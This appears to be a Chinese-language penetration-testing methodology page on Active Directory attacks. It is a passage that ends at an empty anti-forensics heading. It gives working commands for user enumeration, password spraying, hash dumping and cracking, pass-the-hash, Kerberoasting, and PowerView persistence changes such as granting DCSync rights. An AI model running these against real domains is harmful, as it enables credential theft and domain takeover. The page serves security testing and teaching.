# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使得 **网络管理员** 能够高效地在网络中创建和管理 **domains**, **users**, 和 **objects**。它被设计为可伸缩的，方便将大量用户组织成可管理的 **groups** 和 **subgroups**，同时在不同层级上控制 **access rights**。

**Active Directory** 的结构由三层主要组成：**domains**, **trees**, 和 **forests**。一个 **domain** 包含一组对象，例如 **users** 或 **devices**，共享一个公共数据库。**Trees** 是这些 domains 按共享结构链接的分组，而 **forest** 则表示多个 trees 的集合，通过 **trust relationships** 互相连接，构成组织结构的最上层。可以在每一层级指定特定的 **access** 与 **communication rights**。

Active Directory 中的关键概念包括：

1. **Directory** – 存放与 Active Directory 对象相关的所有信息。
2. **Object** – 表示目录中的实体，包括 **users**, **groups**, 或 **shared folders**。
3. **Domain** – 用于容纳目录对象的容器，在一个 **forest** 中可以存在多个 domain，每个 domain 保持自己的对象集合。
4. **Tree** – 一组共享相同根域的 domains。
5. **Forest** – Active Directory 中的组织结构顶层，由多个具有 **trust relationships** 的 trees 组成。

**Active Directory Domain Services (AD DS)** 涵盖了一系列对集中式管理和网络内部通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中数据存储并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 负责创建、分发和管理安全的 **digital certificates**。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持需要目录的应用。
4. **Directory Federation Services** – 提供 **single-sign-on** 功能，使用户能在一次会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过控制未经授权的分发和使用，帮助保护版权材料。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

欲了解更详细的说明，请查看：[**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos 认证**

要学习如何 **attack an AD**，你需要非常熟悉 **Kerberos authentication process**。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 备忘清单

你可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io) 快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只有对 AD 环境的访问权限，但没有任何凭据/会话，你可以：

- **Pentest the network:**
- 扫描网络，查找主机和开放端口，并尝试 **exploit vulnerabilities** 或 **extract credentials**（例如，(for example, [printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供域内关键服务器的信息，例如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取有关如何执行这些操作的更多信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常不起作用）：
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 有关如何枚举 SMB 服务器的更详细指南可以在这里找到：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 有关如何枚举 LDAP 的更详细指南可以在这里找到（请**特别注意匿名访问**）：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 收集凭据，方法包括 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机
- 通过 **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭据
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html)：
- 从内部文档、社交媒体、域内的服务（主要是 web）以及公开可得的资源中提取用户名/姓名等信息。
- 如果你找到了公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名约定有：_NameSurname_, _Name.Surname_, _NamSur_（每部分取 3 个字母）、_Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 以及 3 个随机字母加 3 个随机数字（例如 abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求一个 **invalid username** 时，服务器会返回 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_，这能让我们判定用户名无效。**Valid usernames** 会导致返回 **TGT in a AS-REP** 响应或错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要进行预认证。
- **No Authentication against MS-NRPC**: 对域控制器上的 MS-NRPC (Netlogon) 接口使用 auth-level = 1（无认证）。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在没有任何凭据的情况下检查用户或计算机是否存在。NauthNRPC (https://github.com/sud0Ru/NauthNRPC) 工具实现了此类枚举。相关研究可见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了其中一台服务器，你也可以对其执行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 你可以在 [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  和 ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) 找到用户名列表。
>
> 不过，你应该已经在之前进行的 recon 步骤中收集到 **公司在职员工的姓名**。有了名和姓，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成潜在的有效用户名。

### 已知一个或多个用户名

好，你已经有了一个有效的用户名但没有密码... 那么尝试：

- [**ASREPRoast**](asreproast.md): 如果某用户 **没有** 属性 _DONT_REQ_PREAUTH_，你可以 **请求一个 AS_REP message** 给该用户，该消息将包含一些由该用户密码派生并加密的数据。
- [**Password Spraying**](password-spraying.md): 对每个发现的用户尝试最常见的密码，也许有用户使用弱密码（注意密码策略！）。
- 注意你也可以 **spray OWA servers**，尝试获取用户邮件服务器的访问。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能可以通过对网络某些协议进行 **poisoning** 来**获取**一些用于破解的 challenge **hashes**：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已成功枚举 Active Directory，你将获得 **更多的邮件地址并对网络有更好的理解**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来访问 AD 环境。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 来为每次 engagement 保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为每种协议生成 SQLite DB（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换视图，用 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 做快速子网发现，可显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的主机为 **relay-prone**，而 DCs 通常需要签名。
- 直接从 NetExec 输出生成 **hostnames in /etc/hosts** 以便于定位目标：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** by signing，仍然探测 **LDAP** posture：`netexec ldap <dc>` 会显示 `(signing:None)` / weak channel binding。要求 SMB signing 但禁用 LDAP signing 的 DC 仍然是一个可行的 **relay-to-LDAP** 目标，可被用于像 **SPN-less RBCD** 这样的滥用。

### 客户端打印机 credential leaks → 批量域 credential 验证

- 打印机/网页 UIs 有时会 **embed masked admin passwords in HTML**。查看 source/devtools 可以揭示明文（例如，`<input value="<password>">`），从而允许通过 Basic-auth 访问 scan/print repositories。
- 检索到的打印任务可能包含带有每用户密码的 **plaintext onboarding docs**。测试时保持配对对齐：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM Creds

如果你能用 **null or guest user** **access other PCs or shares**，你可以 **place files**（比如 SCF file），当这些文件以某种方式被访问时，会 **trigger an NTLM authentication against you**，这样你就可以 **steal** **NTLM challenge** 来破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已经拥有的每个 NT hash 当作其它、较慢格式的候选密码，这些慢格式的密钥材料直接由 NT hash 派生。与其在 Kerberos RC4 tickets、NetNTLM challenges 或 cached credentials 上对长口令进行暴力破解，不如把 NT hashes 输入到 Hashcat 的 NT-candidate 模式，让它验证密码重用而不需要知道明文。在域被攻破后从数千个当前和历史 NT hashes 中收集后，这种方法尤其有效。

在以下情况下使用 shucking：

- 你有来自 DCSync、SAM/SECURITY dumps 或 credential vaults 的 NT 语料，需要测试在其它域/forest 中的重用情况。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`, `$krb5asrep$23$`）、NetNTLM 响应，或 DCC/DCC2 blob。
- 你想快速证明长且难以破解的口令被重用，并立即通过 Pass-the-Hash 进行 pivot。

该技术对密钥不是由 NT hash 派生的加密类型无效（例如 Kerberos etype 17/18 AES）。如果域强制仅使用 AES，则必须回退到常规密码模式。

#### 建立 NT hash 语料库

- **DCSync/NTDS** – 使用 `secretsdump.py` 并带上 history 来抓取尽可能多的 NT hashes（及其以前的值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目大幅扩大候选池，因为 Microsoft 可以为每个账号存储多达 24 个先前的 hash。有关更多获取 NTDS secrets 的方法请参见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。对这些 hashes 去重并追加到同一个 `nt_candidates.txt` 列表。
- **跟踪元数据** – 保留生成每个 hash 的用户名/域（即使 wordlist 只包含十六进制）。一旦 Hashcat 打印出胜出候选，匹配的 hashes 会立即告诉你哪个主体在重用该密码。
- 优先选择来自同一 forest 或受信任 forest 的候选；这可最大化 shucking 时的重叠机会。

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 的输入 **必须保持原始的 32 字节十六进制 NT hashes**。禁用规则引擎（不要使用 `-r`，不要使用混合模式），因为变形会破坏候选密钥材料。
- 这些模式本身并不一定更快，但 NTLM 的密钥空间（在 M3 Max 上约 ~30,000 MH/s）比 Kerberos RC4（约 ~300 MH/s）快约 100×。测试经过筛选的 NT 列表远比在慢格式中探索整个密码空间便宜。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是最近加入的。
- 目前没有面向 AS-REQ Pre-Auth 的 NT 模式，而且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是由 UTF-16LE 密码通过 PBKDF2 派生的，而不是原始 NT hashes。

#### 示例 – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（参见 Kerberoast 页面了解细节）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 从每个 NT candidate 派生 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配确认该 service account 使用了你现有的某个 NT hash。

3. 立即通过 PtH 进行 pivot：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，你也可以稍后使用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### 示例 – Cached credentials (mode 31600)

1. 从已攻陷的工作站转储缓存的登录：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣域用户的 DCC2 行拷贝到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会得到你列表中已知的 NT hash，证明该缓存用户正在重用密码。可以直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或在快速的 NTLM 模式下对其进行离线暴力以恢复明文。

完全相同的工作流适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配，你可以发起 relay、SMB/WMI/WinRM PtH，或使用 masks/rules 离线重新破解 NT hash。



## 使用凭证/会话枚举 Active Directory

在这个阶段你需要已经**compromised the credentials or a session of a valid domain account**。如果你拥有一些有效的凭证或以域用户的 shell，会话开始前应记住之前提到的选项仍然是用来进一步攻破其他用户的手段。

在开始认证枚举之前，你应该了解 **Kerberos double hop problem**。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

攻破一个账号是开始攻破整个域的**重要一步**，因为你将能够开始进行 **Active Directory Enumeration：**

关于 [**ASREPRoast**](asreproast.md) 你现在可以找到每个可能的易受攻击用户；关于 [**Password Spraying**](password-spraying.md) 你可以获取 **所有用户名的列表** 并尝试已泄露账号的密码、空密码以及新的可疑密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽一些
- 你也可以 [**use powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- 另一个在 Active Directory 中用于侦察的极好工具是 [**BloodHound**](bloodhound.md)。根据你使用的收集方法，它**不是非常隐蔽**，但**如果你不在意**，你应该尝试它。找到哪些用户可以 RDP、找到到其他组的路径等。
- **其它自动化 AD 枚举工具包括：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS 记录**](ad-dns-records.md)，因为它们可能包含有趣的信息。
- 一个带 GUI 的目录枚举工具是来自 **SysInternal** Suite 的 **AdExplorer.exe**。
- 你也可以使用 **ldapsearch** 在 LDAP 数据库中搜索 _userPassword_ 和 _unixUserPassword_ 字段以查找凭证，甚至查找 _Description_ 字段。参见 PayloadsAllTheThings 上的 [Password in AD User comment](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 了解其它方法。
- 如果你使用 **Linux**，也可以使用 [**pywerview**](https://github.com/the-useless-one/pywerview) 来枚举域。
- 你也可以尝试以下自动化工具：
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 获取所有域用户名非常简单（`net user /domain`，`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即便这个 Enumeration 部分看起来很短，但这是最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound 的链接），学习如何枚举一个域并练习直到你感觉熟练。在一次评估中，这将是找到通往 DA 的关键时刻，或者决定无法继续的关键点。

### Kerberoast

Kerberoasting 涉及获取与用户账号关联的 **TGS tickets** 并离线破解它们的加密——这些加密基于用户密码。

更多详情见：


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

一旦你获得了一些凭证，你可以检查是否可以访问任何 **machine**。为此，你可以使用 **CrackMapExec** 根据端口扫描尝试通过不同协议连接多台服务器。

### Local Privilege Escalation

如果你已经以普通域用户的凭证或会话妥协，并且使用该用户可以访问域内的 **任何机器**，你应该尝试在本地提升权限并搜掠凭证（looting for credentials）。因为只有拥有本地管理员权限你才能转储其他用户在内存（LSASS）和本地（SAM）中的 hashes。

本书中有一整页关于 [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) 以及一份 [**checklist**](../checklist-windows-privilege-escalation.md)。另外别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### Current Session Tickets

在当前用户会话中找到能让你访问意外资源的 **tickets** 的可能性非常小，但你仍然可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

如果你已成功枚举 Active Directory，你会得到**更多邮箱地址并对网络有更深入的了解**。你可能能够强制执行 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)。

### 在 Computer Shares 中查找 Creds | SMB Shares

现在你已有一些基本凭证，应检查是否能**找到**任何在 AD 内被**共享的有趣文件**。你可以手动进行，但这是非常枯燥且重复的任务（如果你发现数百个文档需要检查，工作量会更大）。

[**点击此链接了解可用工具。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你能**访问其他 PCs 或共享**，可以**放置文件**（例如 SCF 文件），当这些文件被访问时会**触发针对你的 NTLM authentication**，从而让你**窃取**用于破解的**NTLM challenge**：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

此漏洞允许任何经过身份验证的用户**接管域控制器**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭证/会话进行权限提升

**对于下面的技术，普通域用户不够，你需要一些特殊权限/凭证来执行这些攻击。**

### Hash extraction

希望你已经设法使用 [AsRepRoast](asreproast.md)、[Password Spraying](password-spraying.md)、[Kerberoast](kerberoast.md)、[Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）、[EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)、[escalating privileges locally](../windows-local-privilege-escalation/index.html) 等方法攻破了一些本地管理员账户。\
然后，现在是转储内存和本地所有哈希的时候了。\
[**阅读此页面了解获取哈希的不同方法。**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**一旦你获得了某个用户的 hash**，你就可以用它来**冒充**该用户。\
你需要使用某个**工具**来使用该**hash**执行**NTLM authentication**，**或者**你可以创建一个新的**sessionlogon**并将该**hash**注入到**LSASS**，这样当执行任何**NTLM authentication**时，该**hash**就会被使用。最后一种方法就是 mimikatz 所做的。\
[**阅读此页面了解更多信息。**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在**使用用户的 NTLM hash 请求 Kerberos tickets**，作为常见的 Pass The Hash over NTLM 协议的替代。因此，这在 NTLM 协议被禁用且仅允许 Kerberos 作为身份验证协议的网络中特别**有用**。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**窃取用户的 authentication ticket**，而不是其密码或哈希值。被窃取的 ticket 随后用于**冒充该用户**，从而在网络中未授权访问资源和服务。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个本地管理员的**hash**或**password**，应尝试用它在其他**PCs**上**本地登录**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 请注意，这种方法会产生相当多的噪音，且 **LAPS** 可以缓解此问题。

### MSSQL Abuse & Trusted Links

如果某个用户有权限**访问 MSSQL 实例**，他可能能够利用它在 MSSQL 主机上**执行命令**（如果以 SA 身份运行）、**窃取** NetNTLM **hash** 或甚至进行 **relay attack**。\
另外，如果一个 MSSQL 实例被另一个 MSSQL 实例所信任（database link），且该用户对受信任的数据库有权限，他将能够**利用信任关系在另一个实例上也执行查询**。这些信任可以被串联，最终用户可能找到一个配置错误的数据库并在上面执行命令。\
**跨林（forest）信任，数据库之间的链接也能生效。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

第三方的资产清点和部署套件通常会暴露获取凭据和执行代码的强大途径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)，并且你在该计算机上拥有域权限，你就能够从内存中转储所有登录该计算机用户的 TGTs。\
因此，如果**Domain Admin 登录到该计算机**，你将能够转储其 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 冒充他。\
借助 constrained delegation，你甚至可以**自动接管一个 Print Server**（希望它是 DC）。

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许进行 "Constrained Delegation"，它将能够**以被模拟用户的身份访问目标计算机上的某些服务**。\
因此，如果你**破解了该用户/计算机的 hash**，你就能**模拟任意用户**（包括 domain admins）来访问这些服务。

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限可使你达到以**提升的权限执行代码**的目的：

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻破的用户可能对某些域对象拥有一些**有趣的权限**，这些权限可能让你后续**横向移动/提权**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现**Spool 服务正在监听**的情形可以被**滥用**以**获取新凭据**并**提升权限**。

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻破**的机器，有可能**从内存中收集凭据**，甚至**在他们的进程中注入 beacons** 以冒充他们。\
通常用户会通过 RDP 访问系统，下面是如何对第三方 RDP 会话执行几个攻击的说明：

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一套管理域加入计算机上**本地 Administrator 密码**的系统，确保密码是**随机的**、唯一且定期**更改**。这些密码存储在 Active Directory 中，并通过 ACLs 控制仅授权用户访问。只要有足够权限读取这些密码，就可以进行跨机器的 pivot（横向移动）。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**从被攻破的机器收集证书**可能成为在环境内提升权限的一种手段：

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的模板**，可以滥用它们来提升权限：

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin**，乃至更高级的 **Enterprise Admin** 权限，你可以**转储域数据库**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以被用作持久化。\
例如你可以：

- 让用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 让用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 授予用户 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

The **Silver Ticket attack** 通过使用 **NTLM hash**（例如 PC 帐户的 hash）为特定服务创建一个**合法的 TGS ticket**，从而用于**获取服务权限**。

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

A **Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt 帐户的 NTLM hash**。该帐户用于为所有 **Ticket Granting Tickets (TGTs)** 签名，这些 TGTs 是在 AD 网络中进行身份验证的关键。

一旦攻击者获得该 hash，就可以为任意帐户伪造 **TGTs**（即 Silver ticket 攻击的基础）。

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似于 golden tickets，但伪造方式能够**绕过常见的 golden tickets 检测机制**。

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个帐户的证书或能够为其申请证书**是保持该用户帐户持久化（即便其更改了密码）的非常有效手段：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限保持持久化：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过对这些特权组（如 Domain Admins 和 Enterprise Admins）应用统一的 **ACL** 来确保持久的安全配置，以防止未经授权的更改。然而，如果攻击者修改了 AdminSDHolder 的 ACL 给普通用户完全访问权限，该用户将对所有特权组获得广泛控制。这个用于保护的机制如果没有严格监控，反而可能被滥用导致未授权访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 内部都存在一个**本地管理员**账户。通过在此类机器上获取管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。之后需要修改注册表以**启用该密码的使用**，从而实现远程访问该本地 Administrator 帐户。

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以为某个 **用户** 在某些特定域对象上**授予特殊权限**，这些权限将在未来让该用户能够**提升权限**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** 用于**存储对象的权限**。如果你仅对某对象的 security descriptor 做一处**微小修改**，就可以在不成为某个特权组成员的情况下获取对该对象的非常有价值的权限。

{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

